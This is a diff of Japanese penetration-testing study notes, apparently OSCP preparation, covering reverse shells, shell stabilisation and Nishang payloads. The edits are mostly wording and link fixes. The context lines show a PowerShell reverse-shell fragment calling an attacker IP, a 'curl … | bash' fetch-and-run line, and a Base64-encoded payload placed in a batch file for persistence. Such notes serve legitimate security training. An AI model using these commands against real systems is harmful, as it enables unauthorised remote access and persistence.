@@ -59,7 +59,7 @@ nc <target_IP> <Port>
 $$左が攻撃側、右がターゲット側$$
 
 > [!NOTE]
-> Bind Shellは実践ではほとんど使わない。
+> Bind ShellはOSCPではほとんど使わなかった。
 
 ## Reverse Shellとは
 
@@ -198,7 +198,7 @@ $Text = '$client = New-Object System.Net.Sockets.TCPClient("<attacker_IP>",<PORT
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
 $EncodedText =[Convert]::ToBase64String($Bytes)
 ```
-- [Base64 Encoder](https://www.base64encode.org/)を使う場合は、UTF-16LE(PowerShell対応の文字コード)を用いて、`$Text = ''`以外をエンコード
+- 🔗[Base64 Encoder](https://www.base64encode.org/)を使う場合は、UTF-16LE(PowerShell対応の文字コード)を用いて、`$Text = ''`以外をエンコード
 
 4. エンコード結果を表示し、メモした後、PowerShellからexitする
 ```powershell
@@ -287,8 +287,7 @@ stty raw -echo; fg
 - ※見た目が一時的に乱れるが、安定性は向上する
 
 > [!Info]
-> シェルから離脱したいときや、文字化けや入力異常が起きたときは、`reset`を実行
-> 
+> シェルから離脱したいときや、文字化けや入力異常が起きたときは、`reset`を実行。
 
 ### 安定化 w/o Python
 
@@ -314,13 +313,13 @@ sudo rlwrap nc -lvnp <Port>
 curl <attacker_IP>/exploit.sh | bash
 ```
 
-5. リバースシェルを確立したら、[What is the shell](#安定化%20w/%20Python)へ進む
+5. リバースシェルを確立したら、[安定化 w/ Python](#安定化%20w/%20Python)へ進む
 
 ---
 
 ## 🪟 Windowsターゲット向け安定化
 
-Windowsでは安定化する手法が限られており、効果的な手法は[What is the shell](#OS共通：rlwrapを使ってリスナーを立てる)か、[What is the shell](#Metasploit%20-%20multi/handler)を使う
+Windowsでは安定化する手法が限られており、効果的な手法は`rlwrap`でリスナーをセットアップするか、[Metasploit - multi/handler](#Metasploit%20-%20multi/handler)を使う
 
 その他、PowerShellのエンコーディングの問題や文字化け解消に使えるテクニック
 ```powershell
@@ -334,10 +333,10 @@ chcp 65001
 
 ## Netcat
 
-- ❌デフォルトでは非常に不安定なシェル
 - ✅標準インストールされていることが多い
 - ✅カスタマイズ性高
 - ✅列挙中にバナー情報収集するためなど、あらゆるネットワークへのインタラクションを手動で実行する
+- ❌デフォルトでは非常に不安定なシェル
 
 ```zsh
 # Bind Shell
@@ -426,10 +425,10 @@ socat TCP:<target_IP>:<Port> -
 
 ## Windows PowerShellのリバースシェル w/ Nishang
 
-[Nishang - GitHub](https://github.com/samratashok/nishang)（apt install対応）
+🔗[Nishang - GitHub](https://github.com/samratashok/nishang)
 
 - 目的：Windowsマシンへの侵害後、永続化のため
-	- 他の[What is the shell](#Base64化したPowerShellリバースシェルワンライナー)などがうまくいかないときに使う
+	- [Base64化したPowerShellリバースシェルワンライナー](#Base64化したPowerShellリバースシェルワンライナー)などがうまくいかないときに使う
 
 1. 攻撃者のマシンでリバースシェルペイロードスクリプトを用意する
 ```zsh
@@ -443,7 +442,7 @@ subl Invoke-PowerShellTcpOneLine.ps1
 
 ![](../../画像ファイル/Pasted%20image%2020251107074119.png)
 
-$$ペイロードは赤枠部分を使う(smは圧縮版）$$
+$$ペイロードは赤枠部分を使う($smは圧縮版）$$
 
 3. PowerShellスクリプトをシェルから直接渡すため、Base64エンコードする
 ```zsh
@@ -454,7 +453,7 @@ cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le | base64 -w 0
 
 (a) エンコードしたペイロードをバッチファイルに書き込んだ上で、実行する方法
 	タスクスケジューラに登録するなどの用途
-```powerhsell
+```powershell
 echo powershell -enc '<Base64エンコードされたペイロード>' > <filename>.bat
 ```
 
@@ -473,7 +472,7 @@ Metasploitフレームワークの `exploit/multi/handler` モジュールは、
 - ✅ ファイルのアップロード・ダウンロードなど多くの機能を内蔵している
 - ❌ Meterpreterシェルは必ずMetasploit経由の通信が必要（通常のシェルペイロードはncでも受信可能）
 
-**Meterpreterシェルを使用したい場合は必須。** ステージドペイロードを使用する場合も、このハンドラを使用する（→ [☠️Msfvenom](#) 参照）。
+**Meterpreterシェルを使用したい場合は必須。** ステージドペイロードを使用する場合も、このハンドラを使用する（[☠️Msfvenom](#) 参照）。
 
 >[!Info]
 >Meterpreterシェルとは、Metasploit独自の高機能シェル。
